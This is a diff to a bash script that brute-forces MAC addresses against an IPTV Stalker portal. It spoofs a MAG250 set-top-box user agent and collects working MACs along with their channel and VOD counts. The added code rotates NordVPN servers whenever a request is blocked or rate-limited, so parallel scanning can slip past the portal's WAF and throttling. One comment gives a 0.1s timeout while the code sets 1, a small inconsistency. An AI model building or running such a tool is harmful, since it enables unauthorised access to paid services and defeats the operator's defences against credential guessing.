@@ -15,9 +15,63 @@ RESET=$'\033[0m'
 CLEAR_LINE=$'\033[2K'
 
 UA="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG250 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
-# Very-low per-request timeout: blocked/ratelimited IPs hang ~12s before closing;
-# fail fast and ignore such responses instead of stalling workers.
-SCAN_TIMEOUT=2
+# 0.1s per-request timeout: a blocked/ratelimited (WAF) IP is detected as fast
+# as possible — curl returns 000 on timeout — so we can hop to a fresh VPN
+# server without stalling the workers.
+SCAN_TIMEOUT=1
+
+# ---------------------------------------------------------------------------
+# NordVPN: every request goes through an active tunnel. On a blocked or
+# ratelimited IP (non-200 handshake) we hop to a fresh server (any region)
+# immediately — no waiting. Hops are serialized via flock so parallel workers
+# can't stack nordvpn connect calls on each other.
+# ---------------------------------------------------------------------------
+if ! command -v nordvpn >/dev/null 2>&1; then
+  echo "${RED}nordvpn CLI not found (the 'nordvpn' CLI must be installed).${RESET}"
+  exit 1
+fi
+VPN_LOCK=$(mktemp)      # serializes a hop across all workers
+VPN_GEN=$(mktemp)       # index of the country currently up
+echo 0 > "$VPN_GEN"
+mapfile -t VPN_COUNTRIES < <(nordvpn countries 2>/dev/null | grep -v '^[[:space:]]*$')
+[ ${#VPN_COUNTRIES[@]} -gt 0 ] || VPN_COUNTRIES=(Germany Netherlands France Canada Japan United_States)
+
+vpn_connected() { nordvpn status 2>/dev/null | grep -q '^Status: Connected'; }
+
+# Ensure a tunnel is up before any scanning starts.
+ensure_vpn() {
+  vpn_connected && { echo 0 > "$VPN_GEN"; return 0; }
+  progress "${YELLOW}Connecting NordVPN…${RESET}"
+  local n=0
+  while (( n < 5 )); do
+    nordvpn connect "${VPN_COUNTRIES[0]}" >/dev/null 2>&1
+    vpn_connected && { echo 0 > "$VPN_GEN"; return 0; }
+    sleep 1; n=$(( n + 1 ))
+  done
+  vpn_connected || progress "${RED}Warning: no active VPN tunnel yet${RESET}"
+}
+
+# Hop to a different server (fresh IP) right away. Serialized via VPN_LOCK so
+# parallel workers don't stack nordvpn connect calls on each other.
+vpn_switch() {
+  (
+    flock -x 9
+    len=${#VPN_COUNTRIES[@]}
+    i=$(( ($( <"$VPN_GEN") + 1) % len ))
+    ok=0; tries=0
+    while (( tries < len )); do
+      country=${VPN_COUNTRIES[i]}
+      nordvpn connect "$country" >/dev/null 2>&1
+      if vpn_connected; then echo "$i" > "$VPN_GEN"; ok=1; break; fi
+      i=$(( (i + 1) % len )); tries=$(( tries + 1 ))
+    done
+    if (( ok )); then
+      progress "scanning: [${YELLOW}blocked → new VPN: ${country}${RESET}]"
+    else
+      progress "scanning: [${RED}blocked, VPN reconnecting…${RESET}]"
+    fi
+  ) 9>"$VPN_LOCK"
+}
 
 read -rp "${YELLOW}How many MACs do you want to find? ${RESET}" max_success_count
 read -rp "${YELLOW}Parallel workers? [10] ${RESET}" num_workers
@@ -52,9 +106,11 @@ scan_mac() {
       -H "User-Agent: $UA" \
       -H "Cookie: $cookie" \
       "$URL/portal.php?type=stb&action=handshake&JsHttpRequest=1-xml")
-    # 000 / non-200 handshake (blocked, ratelimited, ...): show, try next MAC
+    # 000 / non-200 handshake (blocked, ratelimited, ...): hop to a fresh
+    # VPN server for a new source IP, then try the next MAC.
     if [[ $response != *"200"* ]]; then
       progress "scanning: $MAC [${RED}connection failed, ratelimited?${RESET}]"
+      vpn_switch
       continue
     fi
 
@@ -143,6 +199,9 @@ scan_mac() {
 pids=()
 trap 'kill "${pids[@]}" 2>/dev/null; wait "${pids[@]}" 2>/dev/null; show_summary; exit 1' INT TERM
 
+# Never scan without an active tunnel.
+ensure_vpn
+
 for ((i=0; i<num_workers; i++)); do
   scan_mac &
   pids+=($!)
@@ -156,7 +215,7 @@ show_summary() {
       printf '%s  %s%s%s  Live TV: %s  VOD: %s  Series: %s%s\n' "$LIGHT_BLUE" "$GREEN" "$mac" "$LIGHT_BLUE" "$live" "$vod" "$series" "$RESET"
     done
   fi
-  rm -f "$success_file" "$success_file.lock" "$hit_file"
+  rm -f "$success_file" "$success_file.lock" "$hit_file" "$VPN_LOCK" "$VPN_GEN"
 }
 
 wait
